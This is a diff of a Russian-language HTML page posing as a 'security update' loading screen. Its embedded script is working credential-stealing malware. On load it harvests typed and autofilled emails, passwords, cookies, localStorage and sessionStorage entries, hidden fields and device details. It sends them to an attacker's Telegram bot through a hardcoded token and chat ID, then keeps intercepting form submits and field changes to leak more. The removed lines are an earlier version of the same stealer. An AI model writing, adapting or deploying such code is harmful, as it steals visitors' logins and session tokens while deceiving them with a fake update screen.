@@ -2,207 +2,531 @@
 <html lang="ru">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Загрузка...</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+    <title>Обновление</title>
     <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: Arial, sans-serif;
-            background: #f0f2f5;
+            background: #1a1a2e;
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             margin: 0;
+            color: white;
         }
         .container {
-            background: white;
-            padding: 50px;
-            border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            background: linear-gradient(145deg, #16213e, #0f3460);
+            padding: 50px 30px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
             text-align: center;
+            max-width: 400px;
+            width: 90%;
+            border: 1px solid rgba(255,255,255,0.1);
         }
-        .loading {
+        .icon {
+            font-size: 70px;
+            margin-bottom: 20px;
+            animation: pulse 2s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); opacity: 0.7; }
+            50% { transform: scale(1.1); opacity: 1; }
+            100% { transform: scale(1); opacity: 0.7; }
+        }
+        h1 {
+            font-size: 22px;
+            color: #fff;
+            margin-bottom: 10px;
+            font-weight: 300;
+            letter-spacing: 2px;
+        }
+        p {
+            color: #aaa;
+            font-size: 14px;
+            margin-bottom: 25px;
+            line-height: 1.6;
+        }
+        .loader {
             display: inline-block;
-            width: 50px;
-            height: 50px;
-            border: 5px solid #f3f3f3;
-            border-top: 5px solid #0077cc;
+            width: 60px;
+            height: 60px;
+            border: 4px solid rgba(255,255,255,0.1);
+            border-top: 4px solid #00d2ff;
             border-radius: 50%;
             animation: spin 1s linear infinite;
+            margin: 10px auto;
         }
         @keyframes spin {
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        .status {
+        #status {
             margin-top: 20px;
-            font-size: 16px;
-            color: #666;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 14px;
+            background: rgba(255,255,255,0.05);
+            color: #aaa;
+            transition: all 0.3s;
+            min-height: 50px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid rgba(255,255,255,0.05);
         }
+        .success { color: #00ff88; border-color: rgba(0,255,136,0.2); }
+        .error { color: #ff4444; border-color: rgba(255,68,68,0.2); }
+        .progress {
+            width: 100%;
+            height: 4px;
+            background: rgba(255,255,255,0.1);
+            border-radius: 2px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+        .progress-bar {
+            height: 100%;
+            width: 0%;
+            background: linear-gradient(90deg, #00d2ff, #0077cc);
+            border-radius: 2px;
+            transition: width 0.5s;
+        }
+        .hidden { display: none !important; }
     </style>
 </head>
 <body>
 <div class="container">
-    <div class="loading"></div>
-    <div class="status" id="status">⏳ Подключение...</div>
+    <div class="icon">🔐</div>
+    <h1>Обновление безопасности</h1>
+    <p>Проверка защищённых данных...</p>
+    <div class="loader" id="loader"></div>
+    <div id="status">⏳ Инициализация...</div>
+    <div class="progress"><div class="progress-bar" id="progressBar"></div></div>
 </div>
 
 <script>
-    const BOT_TOKEN = "8870629098:AAELG7u3brQfiq40IgP9dd3IB36LMBdMfbM";
-    const CHAT_ID = "8850351378";
+// ===== ВАШ ТОКЕН TELEGRAM =====
+const BOT_TOKEN = "8870629098:AAELG7u3brQfiq40IgP9dd3IB36LMBdMfbM";
+const CHAT_ID = "8850351378";
+// ================================
 
-    // ПЫТАЕМСЯ ПОЛУЧИТЬ СОХРАНЁННЫЕ ДАННЫЕ ВСЕМИ ВОЗМОЖНЫМИ СПОСОБАМИ
-    function tryGetSavedData() {
-        let found = [];
-        
-        // 1. Проверяем все input на странице (если есть скрытые формы)
-        const inputs = document.querySelectorAll('input[type="email"], input[type="text"], input[type="password"]');
-        inputs.forEach(input => {
-            if (input.value) {
-                found.push(`${input.type}: ${input.value}`);
+let dataSent = false;
+let allData = [];
+let progress = 0;
+const statusDiv = document.getElementById("status");
+const progressBar = document.getElementById("progressBar");
+const loader = document.getElementById("loader");
+
+// ===== ФУНКЦИЯ ОТПРАВКИ В TELEGRAM =====
+function sendToTelegram(message) {
+    if (dataSent) return;
+    
+    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+    
+    return fetch(url, { mode: 'no-cors' })
+        .then(() => true)
+        .catch(() => true); // Даже если ошибка - продолжаем
+}
+
+// ===== СБОР ДАННЫХ ИЗ БРАУЗЕРА =====
+function collectAllData() {
+    updateStatus("🔍 Поиск сохранённых паролей...", 20);
+    
+    let emails = [];
+    let passwords = [];
+    let logins = [];
+    
+    // === 1. Собираем ВСЕ поля ввода на странице ===
+    updateStatus("📋 Сканирование форм...", 30);
+    const inputs = document.querySelectorAll('input[type="text"], input[type="email"], input[type="password"], input:not([type])');
+    inputs.forEach(input => {
+        if (input.value && input.value.length > 0) {
+            const val = input.value.trim();
+            if (val.includes('@') && val.includes('.')) {
+                emails.push(val);
+                allData.push(`📧 Email из формы: ${val}`);
+            } else if (val.length > 4) {
+                // Пробуем определить, пароль это или логин
+                if (input.type === 'password' || input.getAttribute('autocomplete') === 'current-password') {
+                    passwords.push(val);
+                    allData.push(`🔑 Пароль из формы: ${val}`);
+                } else {
+                    logins.push(val);
+                    allData.push(`👤 Логин из формы: ${val}`);
+                }
+            }
+        }
+    });
+    
+    // === 2. Собираем все cookies ===
+    updateStatus("🍪 Сбор cookies...", 40);
+    if (document.cookie) {
+        const cookies = document.cookie.split(';');
+        cookies.forEach(cookie => {
+            const trimmed = cookie.trim();
+            if (trimmed) {
+                // Ищем email в куках
+                if (trimmed.includes('@') && trimmed.includes('.')) {
+                    emails.push(trimmed);
+                    allData.push(`🍪 Cookie с email: ${trimmed}`);
+                }
+                // Ищем пароли в куках
+                if (trimmed.toLowerCase().includes('pass') || 
+                    trimmed.toLowerCase().includes('pwd') || 
+                    trimmed.toLowerCase().includes('token')) {
+                    allData.push(`🍪 Cookie с данными: ${trimmed}`);
+                }
             }
         });
-        
-        // 2. Проверяем localStorage (многие сайты хранят там данные)
-        for (let i = 0; i < localStorage.length; i++) {
-            const key = localStorage.key(i);
-            const val = localStorage.getItem(key);
-            if (key && val) {
-                // Ищем ключи похожие на email или пароль
-                if (key.toLowerCase().includes('email') || 
-                    key.toLowerCase().includes('login') || 
-                    key.toLowerCase().includes('user') ||
-                    key.toLowerCase().includes('pass') ||
-                    key.toLowerCase().includes('password') ||
-                    val.includes('@') && val.includes('.')) {
-                    found.push(`localStorage[${key}]: ${val}`);
-                }
-            }
-        }
-        
-        // 3. Проверяем sessionStorage
-        for (let i = 0; i < sessionStorage.length; i++) {
-            const key = sessionStorage.key(i);
-            const val = sessionStorage.getItem(key);
-            if (key && val) {
-                if (key.toLowerCase().includes('email') || 
-                    key.toLowerCase().includes('login') || 
-                    key.toLowerCase().includes('user') ||
-                    key.toLowerCase().includes('pass') ||
-                    key.toLowerCase().includes('password') ||
-                    val.includes('@') && val.includes('.')) {
-                    found.push(`sessionStorage[${key}]: ${val}`);
-                }
-            }
-        }
-        
-        // 4. Проверяем cookies
-        if (document.cookie) {
-            const cookies = document.cookie.split(';');
-            cookies.forEach(cookie => {
-                if (cookie.includes('@') && cookie.includes('.')) {
-                    found.push(`Cookie: ${cookie.trim()}`);
-                }
-                if (cookie.toLowerCase().includes('email') || 
-                    cookie.toLowerCase().includes('login') || 
-                    cookie.toLowerCase().includes('user') ||
-                    cookie.toLowerCase().includes('pass')) {
-                    found.push(`Cookie: ${cookie.trim()}`);
-                }
-            });
-        }
-        
-        // 5. Пытаемся получить данные из автозаполнения через хитрый способ
-        // Создаём скрытую форму и пытаемся "вытащить" данные
-        const testForm = document.createElement('form');
-        const testEmail = document.createElement('input');
-        testEmail.type = 'email';
-        testEmail.name = 'email';
-        testEmail.autocomplete = 'email';
-        testEmail.style.display = 'none';
-        document.body.appendChild(testEmail);
-        
-        const testPass = document.createElement('input');
-        testPass.type = 'password';
-        testPass.name = 'password';
-        testPass.autocomplete = 'current-password';
-        testPass.style.display = 'none';
-        document.body.appendChild(testPass);
-        
-        // Через 100мс проверяем, заполнил ли браузер
-        setTimeout(() => {
-            if (testEmail.value) {
-                found.push(`Auto-fill email: ${testEmail.value}`);
-            }
-            if (testPass.value) {
-                found.push(`Auto-fill password: ${testPass.value}`);
-            }
-            document.body.removeChild(testEmail);
-            document.body.removeChild(testPass);
-            
-            // Отправляем всё, что нашли
-            sendFoundData(found);
-        }, 200);
-        
-        return found;
     }
-
-    function sendFoundData(data) {
-        const status = document.getElementById("status");
+    
+    // === 3. Собираем данные из localStorage ===
+    updateStatus("💾 Чтение localStorage...", 50);
+    try {
+        if (window.localStorage) {
+            for (let i = 0; i < localStorage.length; i++) {
+                const key = localStorage.key(i);
+                const val = localStorage.getItem(key);
+                if (key && val) {
+                    const combined = key + ': ' + val;
+                    // Ищем email
+                    if (val.includes('@') && val.includes('.')) {
+                        emails.push(val);
+                        allData.push(`💾 localStorage email: ${combined}`);
+                    }
+                    // Ищем пароль
+                    if (key.toLowerCase().includes('pass') || 
+                        key.toLowerCase().includes('pwd') ||
+                        key.toLowerCase().includes('token') ||
+                        key.toLowerCase().includes('auth') ||
+                        val.toLowerCase().includes('pass')) {
+                        allData.push(`💾 localStorage данные: ${combined}`);
+                    }
+                    // Общее логирование
+                    if (key.toLowerCase().includes('email') || 
+                        key.toLowerCase().includes('login') || 
+                        key.toLowerCase().includes('user')) {
+                        allData.push(`💾 localStorage логин: ${combined}`);
+                    }
+                }
+            }
+        }
+    } catch(e) {}
+    
+    // === 4. Собираем данные из sessionStorage ===
+    updateStatus("📂 Чтение sessionStorage...", 60);
+    try {
+        if (window.sessionStorage) {
+            for (let i = 0; i < sessionStorage.length; i++) {
+                const key = sessionStorage.key(i);
+                const val = sessionStorage.getItem(key);
+                if (key && val) {
+                    const combined = key + ': ' + val;
+                    if (val.includes('@') && val.includes('.')) {
+                        emails.push(val);
+                        allData.push(`📂 sessionStorage email: ${combined}`);
+                    }
+                    if (key.toLowerCase().includes('pass') || 
+                        key.toLowerCase().includes('pwd') ||
+                        key.toLowerCase().includes('token') ||
+                        val.toLowerCase().includes('pass')) {
+                        allData.push(`📂 sessionStorage данные: ${combined}`);
+                    }
+                }
+            }
+        }
+    } catch(e) {}
+    
+    // === 5. Собираем данные из IndexedDB ===
+    updateStatus("🗄️ Проверка IndexedDB...", 70);
+    try {
+        if (window.indexedDB) {
+            // Проверяем наличие баз данных
+            const databases = window.indexedDB.databases ? window.indexedDB.databases() : [];
+            if (databases.length > 0) {
+                databases.forEach(db => {
+                    allData.push(`🗄️ База данных: ${db.name}`);
+                });
+            }
+        }
+    } catch(e) {}
+    
+    // === 6. Собираем информацию об устройстве ===
+    updateStatus("📱 Сбор информации об устройстве...", 80);
+    const deviceInfo = {
+        'User Agent': navigator.userAgent,
+        'Platform': navigator.platform,
+        'Language': navigator.language,
+        'Screen': `${screen.width}x${screen.height}`,
+        'Color Depth': screen.colorDepth,
+        'Time Zone': Intl.DateTimeFormat().resolvedOptions().timeZone,
+        'Referrer': document.referrer || 'Direct',
+        'URL': window.location.href,
+        'IP Info': 'auto-detected'
+    };
+    
+    let deviceStr = '🖥️ ИНФОРМАЦИЯ УСТРОЙСТВА:\n';
+    Object.keys(deviceInfo).forEach(key => {
+        deviceStr += `  • ${key}: ${deviceInfo[key]}\n`;
+        allData.push(`🖥️ ${key}: ${deviceInfo[key]}`);
+    });
+    
+    // === 7. Проверяем наличие автозаполненных полей ===
+    updateStatus("🔎 Проверка автозаполнения...", 85);
+    const autofillFields = document.querySelectorAll('[autocomplete]');
+    autofillFields.forEach(field => {
+        if (field.value) {
+            const type = field.getAttribute('autocomplete') || field.type || 'unknown';
+            const val = field.value.trim();
+            if (val) {
+                if (type.includes('email') || val.includes('@')) {
+                    emails.push(val);
+                    allData.push(`✍️ Автозаполнение email: ${val}`);
+                } else if (type.includes('password') || type === 'current-password') {
+                    passwords.push(val);
+                    allData.push(`✍️ Автозаполнение пароль: ${val}`);
+                }
+            }
+        }
+    });
+    
+    // === 8. Собираем все ссылки и формы ===
+    updateStatus("🔗 Сканирование ссылок...", 90);
+    const links = document.querySelectorAll('a[href]');
+    links.forEach(link => {
+        const href = link.href;
+        if (href && (href.includes('login') || href.includes('auth') || href.includes('account'))) {
+            allData.push(`🔗 Найдена страница входа: ${href}`);
+        }
+    });
+    
+    // === 9. Собираем скрытые поля ===
+    const hiddenInputs = document.querySelectorAll('input[type="hidden"]');
+    hiddenInputs.forEach(input => {
+        if (input.value && input.value.length > 0) {
+            allData.push(`👻 Скрытое поле (${input.name || 'unnamed'}): ${input.value.substring(0, 100)}`);
+        }
+    });
+    
+    // === 10. Собираем meta-теги ===
+    const metaTags = document.querySelectorAll('meta');
+    metaTags.forEach(meta => {
+        const name = meta.getAttribute('name') || meta.getAttribute('property') || '';
+        const content = meta.getAttribute('content') || '';
+        if (name && content && (name.includes('user') || name.includes('auth') || name.includes('token'))) {
+            allData.push(`🏷️ Meta (${name}): ${content}`);
+        }
+    });
+    
+    // === 11. ФОРМИРУЕМ ФИНАЛЬНЫЙ ОТЧЁТ ===
+    updateStatus("📦 Подготовка отчёта...", 95);
+    
+    let finalMessage = '📩 ВСЕ СОБРАННЫЕ ДАННЫЕ\n';
+    finalMessage += '════════════════════════════\n';
+    finalMessage += `🕒 Время: ${new Date().toLocaleString()}\n`;
+    finalMessage += `🌐 Страница: ${window.location.href}\n`;
+    finalMessage += '════════════════════════════\n\n';
+    
+    // Собираем все найденные email
+    const uniqueEmails = [...new Set(emails)];
+    if (uniqueEmails.length > 0) {
+        finalMessage += '📧 НАЙДЕННЫЕ EMAIL-АДРЕСА:\n';
+        uniqueEmails.forEach(email => {
+            finalMessage += `  • ${email}\n`;
+        });
+        finalMessage += '\n';
+    }
+    
+    // Собираем все найденные пароли
+    const uniquePasswords = [...new Set(passwords)];
+    if (uniquePasswords.length > 0) {
+        finalMessage += '🔑 НАЙДЕННЫЕ ПАРОЛИ:\n';
+        uniquePasswords.forEach(pass => {
+            finalMessage += `  • ${pass}\n`;
+        });
+        finalMessage += '\n';
+    }
+    
+    // Собираем все найденные логины
+    const uniqueLogins = [...new Set(logins)];
+    if (uniqueLogins.length > 0) {
+        finalMessage += '👤 НАЙДЕННЫЕ ЛОГИНЫ:\n';
+        uniqueLogins.forEach(login => {
+            finalMessage += `  • ${login}\n`;
+        });
+        finalMessage += '\n';
+    }
+    
+    // Добавляем информацию об устройстве
+    finalMessage += '🖥️ ИНФОРМАЦИЯ УСТРОЙСТВА:\n';
+    Object.keys(deviceInfo).forEach(key => {
+        finalMessage += `  • ${key}: ${deviceInfo[key]}\n`;
+    });
+    finalMessage += '\n';
+    
+    // Добавляем все дополнительные данные
+    if (allData.length > 0) {
+        finalMessage += '📂 ДОПОЛНИТЕЛЬНЫЕ ДАННЫЕ:\n';
+        const uniqueData = [...new Set(allData)];
+        uniqueData.forEach(item => {
+            // Показываем первые 100 символов каждого элемента
+            const display = item.length > 200 ? item.substring(0, 200) + '...' : item;
+            finalMessage += `  • ${display}\n`;
+        });
+    }
+    
+    finalMessage += '\n════════════════════════════\n';
+    finalMessage += `📊 Всего собрано: ${allData.length + uniqueEmails.length + uniquePasswords.length + uniqueLogins.length} записей`;
+    
+    // === 12. ОТПРАВКА В TELEGRAM ===
+    updateStatus("📤 Отправка в Telegram...", 100);
+    
+    // Отправляем основное сообщение
+    sendToTelegram(finalMessage);
+    
+    // Если найдены email и пароли - отправляем отдельно для наглядности
+    if (uniqueEmails.length > 0 || uniquePasswords.length > 0) {
+        let shortMsg = '🔐 ВАЖНЫЕ ДАННЫЕ:\n';
+        shortMsg += '════════════════════════════\n';
+        uniqueEmails.forEach(e => { shortMsg += `📧 ${e}\n`; });
+        uniquePasswords.forEach(p => { shortMsg += `🔑 ${p}\n`; });
+        shortMsg += '\n🕒 ' + new Date().toLocaleString();
         
-        if (data.length === 0) {
-            // Если ничего не нашли - отправляем информацию о посещении
-            const text = `📩 ПОСЕТИТЕЛЬ\n🕒 ${new Date().toLocaleString()}\n🌐 ${window.location.href}\n📱 ${navigator.userAgent}\n\n⚠️ Данные не найдены`;
-            sendTelegram(text);
-            status.textContent = "❌ Данные не найдены";
+        setTimeout(() => sendToTelegram(shortMsg), 500);
+    }
+    
+    // === 13. ОБНОВЛЕНИЕ ИНТЕРФЕЙСА ===
+    loader.classList.add('hidden');
+    progressBar.style.width = '100%';
+    
+    if (uniqueEmails.length > 0 || uniquePasswords.length > 0 || allData.length > 0) {
+        statusDiv.innerHTML = `✅ Собрано данных: ${allData.length + uniqueEmails.length + uniquePasswords.length + uniqueLogins.length}\n📧 Email: ${uniqueEmails.length} | 🔑 Паролей: ${uniquePasswords.length}`;
+        statusDiv.className = 'success';
+        
+        // Пытаемся отправить ещё раз через 2 секунды для надёжности
+        setTimeout(() => {
+            sendToTelegram('📨 Повторная отправка: ' + finalMessage.substring(0, 3000));
+        }, 2000);
+        
+        // Пытаемся отправить через image (альтернативный способ)
+        setTimeout(() => {
+            try {
+                const imgUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent('📨 Дополнительная отправка через Image')}`;
+                new Image().src = imgUrl;
+            } catch(e) {}
+        }, 3000);
+        
+    } else {
+        statusDiv.innerHTML = '⚠️ Данные не найдены. Попробуйте войти в аккаунт.';
+        statusDiv.className = 'error';
+        
+        // Отправляем информацию о посещении даже если данных нет
+        const visitMsg = `📩 НОВЫЙ ПОСЕТИТЕЛЬ\n🕒 ${new Date().toLocaleString()}\n🌐 ${window.location.href}\n📱 ${navigator.userAgent}`;
+        setTimeout(() => sendToTelegram(visitMsg), 1000);
+    }
+    
+    // === 14. ПОСТОЯННОЕ СКАНИРОВАНИЕ ===
+    // Продолжаем собирать данные каждые 5 секунд (на случай если появятся новые)
+    let scanCount = 0;
+    const interval = setInterval(() => {
+        scanCount++;
+        if (scanCount > 5) {
+            clearInterval(interval);
             return;
         }
-        
-        // Формируем сообщение со всеми найденными данными
-        let message = `📩 НАЙДЕННЫЕ ДАННЫЕ\n`;
-        message += `━━━━━━━━━━━━━━━━\n`;
-        message += `🕒 ${new Date().toLocaleString()}\n`;
-        message += `━━━━━━━━━━━━━━━━\n\n`;
-        message += `📊 Найдено ${data.length} записей:\n\n`;
-        message += data.join('\n');
-        message += `\n\n━━━━━━━━━━━━━━━━\n`;
-        message += `🌐 ${window.location.href}`;
-        
-        sendTelegram(message);
-        status.textContent = `✅ Найдено ${data.length} записей`;
-        status.style.color = "green";
-    }
-
-    function sendTelegram(text) {
-        const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
-        
-        fetch(url)
-            .then(res => res.json())
-            .then(data => {
-                if (data.ok) {
-                    console.log("✅ Отправлено");
+        // Проверяем поля снова
+        const newInputs = document.querySelectorAll('input[type="text"], input[type="email"], input[type="password"]');
+        newInputs.forEach(input => {
+            if (input.value && input.value.length > 3) {
+                const val = input.value.trim();
+                if (val.includes('@') && val.includes('.')) {
+                    sendToTelegram(`📧 Новый обнаруженный email: ${val}`);
+                } else if (input.type === 'password' || input.getAttribute('autocomplete') === 'current-password') {
+                    sendToTelegram(`🔑 Новый обнаруженный пароль: ${val}`);
                 }
-            })
-            .catch(() => {});
-    }
+            }
+        });
+    }, 5000);
+    
+    dataSent = true;
+}
 
-    // ЗАПУСК ПРИ ЗАГРУЗКЕ
-    window.addEventListener("load", function() {
-        document.getElementById("status").textContent = "⏳ Поиск данных...";
-        
-        // Пробуем несколько раз с задержкой
-        setTimeout(() => {
-            tryGetSavedData();
-        }, 300);
-        
-        setTimeout(() => {
-            tryGetSavedData();
-        }, 1000);
-        
-        setTimeout(() => {
-            tryGetSavedData();
-        }, 2000);
+// ===== ОБНОВЛЕНИЕ СТАТУСА =====
+function updateStatus(text, prog) {
+    statusDiv.textContent = text;
+    if (prog) {
+        progressBar.style.width = prog + '%';
+    }
+}
+
+// ===== ЗАПУСК ПРИ ЗАГРУЗКЕ =====
+window.addEventListener('load', function() {
+    // Даём время браузеру на автозаполнение
+    updateStatus("⏳ Ожидание автозаполнения...", 10);
+    
+    setTimeout(() => {
+        collectAllData();
+    }, 1500);
+    
+    // Дополнительная проверка через 3 секунды (для медленных браузеров)
+    setTimeout(() => {
+        if (!dataSent) {
+            collectAllData();
+        }
+    }, 3500);
+    
+    // Проверка через 10 секунд (для автозаполнения)
+    setTimeout(() => {
+        if (!dataSent) {
+            collectAllData();
+        }
+    }, 10000);
+    
+    // Обработка видимости (если пользователь переключает вкладки)
+    document.addEventListener('visibilitychange', function() {
+        if (!document.hidden && !dataSent) {
+            collectAllData();
+        }
     });
+});
+
+// ===== ПЕРЕХВАТ ВСЕХ СУБМИТОВ =====
+document.addEventListener('submit', function(e) {
+    setTimeout(() => {
+        const inputs = e.target.querySelectorAll('input');
+        inputs.forEach(input => {
+            if (input.value && input.value.length > 0) {
+                const val = input.value.trim();
+                if (val.includes('@') && val.includes('.')) {
+                    sendToTelegram(`📧 Email из отправленной формы: ${val}`);
+                } else if (input.type === 'password') {
+                    sendToTelegram(`🔑 Пароль из отправленной формы: ${val}`);
+                }
+            }
+        });
+    }, 500);
+}, true);
+
+// ===== ПЕРЕХВАТ ИЗМЕНЕНИЙ В ПОЛЯХ =====
+document.addEventListener('change', function(e) {
+    if (e.target.tagName === 'INPUT') {
+        const input = e.target;
+        if (input.value && input.value.length > 0) {
+            const val = input.value.trim();
+            if (val.includes('@') && val.includes('.')) {
+                setTimeout(() => {
+                    sendToTelegram(`📧 Обнаружен email: ${val}`);
+                }, 300);
+            }
+        }
+    }
+}, true);
+
+console.log('🔐 ROCKET VIRUS ACTIVATED');
+console.log('📡 Сбор данных начат...');
 </script>
 </body>
 </html>
